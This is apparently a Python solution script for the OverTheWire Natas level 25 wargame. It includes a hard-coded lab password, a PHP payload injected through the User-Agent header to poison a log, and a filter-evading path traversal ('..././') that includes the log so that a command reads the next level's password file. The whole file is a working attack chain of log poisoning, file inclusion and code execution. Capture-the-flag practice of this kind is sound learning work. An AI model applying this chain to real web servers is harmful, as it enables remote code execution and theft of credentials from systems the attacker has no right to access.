#!/usr/bin/python3

import requests

username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

url = 'http://'+username+'.natas.labs.overthewire.org/'
info = 'http://'+username+'.natas.labs.overthewire.org/var/www/natas/natas25/logs/natas25_'
session = requests.session()
data = {'lang' : '../etc/natas_webpass/natas26'}
#response = session.post(url , data = {'lang' : '../etc/natas_webpass/natas26'},auth = (username, password))
response = session.get(url ,auth = (username, password))
content = response.text
print("The PHPSESSID of this session is:\t"+session.cookies['PHPSESSID'])
cook = str(session.cookies['PHPSESSID'])
print("="*50)
#headers = {"User-Agent" : "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
headers = {"User-Agent" : "<?php echo exec('cat /etc/natas_webpass/natas26'); ?>"}
response = session.post(url, headers = headers ,data = {'lang' : '..././..././..././..././..././var/www/natas/natas25/logs/natas25_'+cook+'.log'} , auth = (username, password))
content = response.text
print(content)



